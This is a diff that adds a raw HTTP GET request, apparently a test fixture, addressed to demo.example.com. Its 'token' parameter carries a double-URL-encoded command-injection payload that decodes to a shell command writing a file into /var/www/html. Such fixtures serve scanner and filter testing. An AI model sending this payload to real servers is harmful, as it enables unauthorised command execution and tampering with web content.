@@ -1,0 +1,4 @@
+GET /a?token=%253B%2Becho%2Bevil%2B%253E%2B%252Fvar%252Fwww%252Fhtml%252Fc.txt HTTP/1.1
+Host: demo.example.com
+Connection: close
+
